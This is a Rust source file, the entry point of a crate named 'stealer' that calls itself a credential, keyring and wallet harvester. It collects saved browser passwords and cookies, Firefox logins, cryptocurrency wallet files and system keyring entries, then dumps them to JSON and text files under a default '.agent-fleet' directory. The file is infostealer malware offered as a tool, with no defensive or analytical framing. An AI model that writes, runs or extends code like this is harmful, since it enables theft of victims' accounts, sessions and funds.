//! One-shot credential, keyring, and wallet harvester.

use std::{
    fs,
    path::PathBuf,
    time::{SystemTime, UNIX_EPOCH},
};

use clap::Parser;
use serde_json::json;
use stealer::{browser, firefox, keyring, make_dir, wallets};

#[derive(Parser, Debug)]
#[command(about = "Collect browser credentials, wallet files, and keyring data")]
struct Cli {
    /// State directory (also the default output root).
    #[arg(long, default_value = ".agent-fleet")]
    state: PathBuf,
    /// Output directory.
    #[arg(long)]
    out: Option<PathBuf>,
    /// Maximum credentials per source.
    #[arg(long, default_value_t = 2000)]
    limit: usize,
    /// Skip browser credential extraction.
    #[arg(long)]
    no_browsers: bool,
    /// Skip Firefox extraction.
    #[arg(long)]
    no_firefox: bool,
    /// Skip wallet collection.
    #[arg(long)]
    no_wallets: bool,
    /// Skip keyring collection.
    #[arg(long)]
    no_keyring: bool,
}

fn main() {
    let cli = Cli::parse();
    let stamp = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|value| value.as_secs())
        .unwrap_or(0);
    let out = cli
        .out
        .unwrap_or_else(|| cli.state.join(format!("harvest-{stamp}")));
    if let Err(error) = make_dir(&out) {
        eprintln!("harvest: cannot create {}: {error}", out.display());
        std::process::exit(2);
    }

    let mut warnings = Vec::new();
    let browser_credentials = if cli.no_browsers {
        Default::default()
    } else {
        browser::harvest(&out, cli.limit)
    };
    warnings.extend(browser_credentials.warnings.clone());
    let firefox_logins = if cli.no_firefox {
        Default::default()
    } else {
        firefox::harvest(cli.limit)
    };
    warnings.extend(firefox_logins.warnings.clone());
    let cookies = &browser_credentials.cookies;
    let wallet_report = if cli.no_wallets {
        Default::default()
    } else {
        wallets::harvest(&out, 4000, 512 * 1024 * 1024)
    };
    warnings.extend(wallet_report.warnings.clone());
    let keyring_report = if cli.no_keyring {
        Default::default()
    } else {
        keyring::harvest()
    };
    warnings.extend(keyring_report.warnings.clone());

    let credentials_path = out.join("credentials.json");
    let _ = fs::write(
        &credentials_path,
        serde_json::to_vec_pretty(&browser_credentials.credentials).unwrap_or_default(),
    );
    if !firefox_logins.logins.is_empty() {
        let _ = fs::write(
            out.join("firefox.json"),
            serde_json::to_vec_pretty(&firefox_logins.logins).unwrap_or_default(),
        );
    }
    if !cookies.is_empty() {
        let _ = fs::write(
            out.join("cookies.json"),
            serde_json::to_vec_pretty(&cookies).unwrap_or_default(),
        );
    }
    if !keyring_report.entries.is_empty() {
        let text = keyring_report
            .entries
            .iter()
            .map(|entry| format!("## {}\n{}\n", entry.source, entry.text))
            .collect::<String>();
        let _ = fs::write(out.join("keyring.txt"), text);
    }
    let _ = fs::write(
        out.join("manifest.json"),
        serde_json::to_vec_pretty(&json!({
            "at": stamp,
            "credentials": browser_credentials.credentials.len(),
            "firefox": firefox_logins.logins.len(),
            "cookies": cookies.len(),
            "wallets": wallet_report.files.len(),
            "keyring_entries": keyring_report.entries.len(),
            "files": wallet_report.files,
            "warnings": warnings,
        }))
        .unwrap_or_default(),
    );

    println!(
        "{}",
        json!({
            "ok": true,
            "out": out,
            "credentials": browser_credentials.credentials.len(),
            "firefox": firefox_logins.logins.len(),
            "cookies": cookies.len(),
            "wallets": wallet_report.files.len(),
            "keyring_entries": keyring_report.entries.len(),
            "warnings": warnings.len(),
        })
    );
}
